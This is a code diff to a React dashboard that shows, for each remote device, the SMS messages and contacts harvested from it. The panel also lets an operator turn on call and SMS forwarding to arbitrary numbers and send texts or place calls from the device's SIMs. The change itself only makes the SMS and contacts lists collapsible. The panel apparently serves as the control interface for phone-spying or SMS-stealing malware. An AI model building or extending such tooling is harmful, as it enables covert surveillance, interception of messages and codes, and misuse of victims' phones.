@@ -10,6 +10,7 @@ export default function App() {
   const [saving, setSaving] = useState({})
   const [acts, setActs] = useState({})
   const [time, setTime] = useState('')
+  const [expanded, setExpanded] = useState({})
 
   const fetchData = useCallback(async () => {
     try {
@@ -148,35 +149,6 @@ export default function App() {
                     </div>
                   )}
 
-                  {sec.sms?.length > 0 && (
-                    <div style={{marginBottom:8}}>
-                      <div style={s.sect}>SMS ({sec.sms.length})</div>
-                      <div style={s.scroll}>
-                        {sec.sms.map((x,j) => (
-                          <div key={x.id||j} style={s.item}>
-                            <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
-                            <div style={{fontSize:11,color:'#475569',wordBreak:'break-word'}}>{x.message||'-'}</div>
-                            <div style={{fontSize:9,color:'#94a3b8'}}>{x.received_at?new Date(x.received_at).toLocaleString():''}</div>
-                          </div>
-                        ))}
-                      </div>
-                    </div>
-                  )}
-
-                  {sec.contacts?.length > 0 && (
-                    <div style={{marginBottom:8}}>
-                      <div style={s.sect}>Contacts ({sec.contacts.length})</div>
-                      <div style={s.scroll}>
-                        {sec.contacts.map((x,j) => (
-                          <div key={x.id||j} style={s.item}>
-                            <div style={{fontWeight:600,fontSize:12}}>{x.name||'-'}</div>
-                            <div style={{fontSize:11,color:'#475569'}}>{x.phone||''}{x.email ? ` | ${x.email}` : ''}</div>
-                          </div>
-                        ))}
-                      </div>
-                    </div>
-                  )}
-
                   {dataTypes.map(({key: t, label}) => {
                     const items = (data[t]||[]).filter(r => r.device_id === id || !r.device_id)
                     if (items.length === 0) return null
@@ -197,60 +169,102 @@ export default function App() {
                     )
                   })}
 
-                    <div style={{marginBottom:8}}>
-                      <div style={s.sect}>Forwarding</div>
-                      <div style={{display:'flex',flexDirection:'column',gap:4}}>
-                        {['Call','SMS'].map(label => {
-                          const k = label.toLowerCase()+'_forwarding'
-                          const nk = k+'_number'
-                          return (
-                            <div key={label} style={{display:'flex',alignItems:'center',gap:6,fontSize:11}}>
-                              <span style={{fontWeight:600,minWidth:30}}>{label}</span>
-                              <input type="text" placeholder="Number" value={fwd[id]?.[nk]||''}
-                                onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],[nk]:e.target.value}}))}
-                                style={{...s.inp,flex:1}} />
-                              <label style={{display:'flex',alignItems:'center',gap:2,fontSize:11,cursor:'pointer'}}>
-                                <input type="checkbox" checked={fwd[id]?.[k]||false}
-                                  onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],[k]:e.target.checked}}))} /> On
-                              </label>
-                            </div>
-                          )
-                        })}
-                        <button onClick={()=>saveFwd(id)} disabled={saving[id]}
-                          style={s.save}>{saving[id]?'Saving...':'Save'}</button>
-                      </div>
+                  <div style={{marginBottom:8}}>
+                    <div style={s.sect}>Forwarding</div>
+                    <div style={{display:'flex',flexDirection:'column',gap:4}}>
+                      {['Call','SMS'].map(label => {
+                        const k = label.toLowerCase()+'_forwarding'
+                        const nk = k+'_number'
+                        return (
+                          <div key={label} style={{display:'flex',alignItems:'center',gap:6,fontSize:11}}>
+                            <span style={{fontWeight:600,minWidth:30}}>{label}</span>
+                            <input type="text" placeholder="Number" value={fwd[id]?.[nk]||''}
+                              onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],[nk]:e.target.value}}))}
+                              style={{...s.inp,flex:1}} />
+                            <label style={{display:'flex',alignItems:'center',gap:2,fontSize:11,cursor:'pointer'}}>
+                              <input type="checkbox" checked={fwd[id]?.[k]||false}
+                                onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],[k]:e.target.checked}}))} /> On
+                            </label>
+                          </div>
+                        )
+                      })}
+                      <button onClick={()=>saveFwd(id)} disabled={saving[id]}
+                        style={s.save}>{saving[id]?'Saving...':'Save'}</button>
                     </div>
+                  </div>
 
-                    <div>
-                      <div style={s.sect}>Actions</div>
-                      <div style={{display:'flex',flexDirection:'column',gap:4}}>
-                        <select value={a.sim_slot||'1'} onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],sim_slot:e.target.value}}))}
-                          style={s.inp}>
-                          {sims.map((x,i) => (
-                            <option key={i} value={x.sim_slot||i+1}>SIM {x.sim_slot||i+1} {x.number ? `(${x.number})` : ''}</option>
-                          ))}
-                          {sims.length === 0 && <option value="1">SIM 1</option>}
-                        </select>
-                        <input type="text" placeholder="Phone number" value={a.target_number||''}
-                          onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],target_number:e.target.value}}))}
-                          style={s.inp} />
-                        <textarea placeholder="SMS message" value={a.message||''}
-                          onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],message:e.target.value}}))}
-                          style={{...s.inp,minHeight:40,resize:'vertical',fontFamily:'inherit'}} />
-                        <div style={{display:'flex',gap:6}}>
-                          <button onClick={()=>{setActs(prev=>({...prev,[id]:{...prev[id],type:'sms'}}));sendAction(id)}} disabled={a.sending}
-                            style={{...s.save,background:'#22c55e',flex:1}}>{a.sending?'...':'Send SMS'}</button>
-                          <button onClick={()=>{setActs(prev=>({...prev,[id]:{...prev[id],type:'call'}}));sendAction(id)}} disabled={a.sending}
-                            style={{...s.save,background:'#ef4444',flex:1}}>{a.sending?'...':'Call'}</button>
-                        </div>
+                  <div style={{marginBottom:8}}>
+                    <div style={s.sect}>Actions</div>
+                    <div style={{display:'flex',flexDirection:'column',gap:4}}>
+                      <select value={a.sim_slot||'1'} onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],sim_slot:e.target.value}}))}
+                        style={s.inp}>
+                        {sims.map((x,i) => (
+                          <option key={i} value={x.sim_slot||i+1}>SIM {x.sim_slot||i+1} {x.number ? `(${x.number})` : ''}</option>
+                        ))}
+                        {sims.length === 0 && <option value="1">SIM 1</option>}
+                      </select>
+                      <input type="text" placeholder="Phone number" value={a.target_number||''}
+                        onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],target_number:e.target.value}}))}
+                        style={s.inp} />
+                      <textarea placeholder="SMS message" value={a.message||''}
+                        onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],message:e.target.value}}))}
+                        style={{...s.inp,minHeight:40,resize:'vertical',fontFamily:'inherit'}} />
+                      <div style={{display:'flex',gap:6}}>
+                        <button onClick={()=>{setActs(prev=>({...prev,[id]:{...prev[id],type:'sms'}}));sendAction(id)}} disabled={a.sending}
+                          style={{...s.save,background:'#22c55e',flex:1}}>{a.sending?'...':'Send SMS'}</button>
+                        <button onClick={()=>{setActs(prev=>({...prev,[id]:{...prev[id],type:'call'}}));sendAction(id)}} disabled={a.sending}
+                          style={{...s.save,background:'#ef4444',flex:1}}>{a.sending?'...':'Call'}</button>
                       </div>
                     </div>
+                  </div>
+
+                  <Sec title={`SMS (${sec.sms?.length||0})`} expanded={expanded} id={id} name="sms" onToggle={setExpanded}>
+                    {!sec.sms?.length ? <div style={s.txt}>No SMS</div> : (
+                      <div style={s.scroll}>
+                        {sec.sms.map((x,j) => (
+                          <div key={x.id||j} style={s.item}>
+                            <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
+                            <div style={{fontSize:11,color:'#475569',wordBreak:'break-word'}}>{x.message||'-'}</div>
+                            <div style={{fontSize:9,color:'#94a3b8'}}>{x.received_at?new Date(x.received_at).toLocaleString():''}</div>
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </Sec>
+
+                  <Sec title={`Contacts (${sec.contacts?.length||0})`} expanded={expanded} id={id} name="contacts" onToggle={setExpanded}>
+                    {!sec.contacts?.length ? <div style={s.txt}>No Contacts</div> : (
+                      <div style={s.scroll}>
+                        {sec.contacts.map((x,j) => (
+                          <div key={x.id||j} style={s.item}>
+                            <div style={{fontWeight:600,fontSize:12}}>{x.name||'-'}</div>
+                            <div style={{fontSize:11,color:'#475569'}}>{x.phone||''}{x.email ? ` | ${x.email}` : ''}</div>
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </Sec>
                 </div>
               )}
             </div>
           )
         })}
       </div>
+    </div>
+  )
+}
+
+function Sec({title, expanded, id, name, onToggle, children}) {
+  const key = `${id}-${name}`
+  const open = expanded[key] !== false
+  return (
+    <div style={{marginBottom:4}}>
+      <div style={{...s.sect, cursor:'pointer', userSelect:'none', display:'flex', justifyContent:'space-between', alignItems:'center', marginTop:6}}
+        onClick={() => onToggle(prev => ({...prev, [key]: !open}))}>
+        <span>{title}</span>
+        <span style={{fontSize:9,color:'#94a3b8'}}>{open ? '▲' : '▼'}</span>
+      </div>
+      {open && children}
     </div>
   )
 }
@@ -268,6 +282,7 @@ const s = {
   sect: { fontSize:11, fontWeight:700, color:'#475569', padding:'5px 0 2px', borderBottom:'1px solid #e2e8f0', marginBottom:2 },
   scroll: { maxHeight:250, overflowY:'auto' },
   item: { padding:'4px 0', borderBottom:'1px solid #f8fafc', fontSize:11 },
+  txt: { padding:'6px 0', color:'#999', fontSize:11 },
   inp: { padding:'5px 8px', border:'1px solid #e2e8f0', borderRadius:6, fontSize:11, outline:'none', width:'100%', boxSizing:'border-box' },
   save: { color:'#fff', border:'none', borderRadius:6, padding:'5px 12px', fontSize:11, fontWeight:600, cursor:'pointer', marginTop:2 },
 }
